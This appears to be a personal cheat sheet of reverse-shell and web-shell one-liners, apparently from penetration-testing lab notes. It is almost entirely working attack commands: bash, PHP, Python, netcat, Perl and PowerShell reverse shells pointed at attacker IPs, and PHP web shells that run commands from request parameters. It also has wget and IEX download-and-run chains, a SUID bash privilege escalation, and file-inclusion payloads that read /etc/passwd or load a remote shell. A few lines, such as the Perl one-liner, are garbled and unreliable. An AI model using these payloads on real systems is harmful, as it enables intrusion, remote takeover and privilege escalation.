## RevShells

#### BASH
```bash
bash -i >& /dev/tcp/192.168.45.187/8091 0>&1

echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/pwned\nchmod 4777 /tmp/pwned' > full-checkup.sh
chmod +x full-checkup.sh
/tmp/pwned -p
```
#### PHP

```bash
php -r '$sock=fsockopen("192.168.45.187", 443);exec("/bin/sh -i <&3 >&3 2>&3");'

cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
python3 -m http.server
nc -nlvp 443
<?php system("wget http://<kali IP>/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>

cp /usr/share/webshells/php/php-reverse-shell.php .
python3 -m http.server 800
nc -nlvp 443
&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php

 &cmd=whoami or ?cmd=whoami
<?php shell_exec($_GET["cmd"]);?>
<?php system($_GET["cmd"]);?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

cp /usr/share/webshells/php/php-reverse-shell.php .
python3 -m http.server 800
nc -nlvp 443
&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php

echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
shell.php&cmd=
```

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
or



#### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.163",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Netcat

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.163 80 >/tmp/f

busybox nc $ip 5000 -e /bin/bash
```

#### Perl

```bash
perl -e 'use Socket:$i="192.168.45.163";$0=443;socket(S,PF INET,SOCK STREAM, getprotobyname("tcp")); if(connect (S, sockaddr_in($p,inet_aton ($i)))) {open(STDIN, ">&S") ; open (STDOUT, ">&S") ;open (STDERR, ">&S") ;exec("/bin/sh -i"T;};'
```

#### CMD

```bash
'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell 
-noprofile'
````

General:

- “Curl ip/reverse.sh | bash” not a bad idea.
- wget'ing to tmp, chmod +x, then bash -c /tmp/pwn.sh

#### PsExec

If you have creds and can't get psexec onto the box, try it locally to get a shell

```bash
proxychains psexec.py USERC:USERCishere@10.11.1.50 cmd.exe
```

#### Bypass Python 2 input()

```bash
__import__('os').system('/bin/bash -p')
```

#### Use ConPty Windows Shell

Make sure to copy raw file whenever copy-pasting from GitHub.

WHENEVER YOU'RE SENDING A POST REQUEST, INCLUDE THE CONTEXT-TYPE HEADER, like 'Content-Type: application/x-www-form-urlencoded'.

```bash
include=echo+WAZZUP%3b
include=/etc/passwd
include=http://10.10.14.8:8000/fake
include=http://10.10.14.8:8000/reverse-shell.php
include=reverse-shell.php
```
When testing for a php reverse shell, you can make a simple php file that says "echo WAZZUP;" and check whether "WAZZUP" is returned in the response.

If that doesn't work, you could have him connect back to us so that we could crack the hash.

```bash
cat conpty.php
system("powershell IEX(IWR http://10.10.14.8:8000/conpty.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.8 80");
```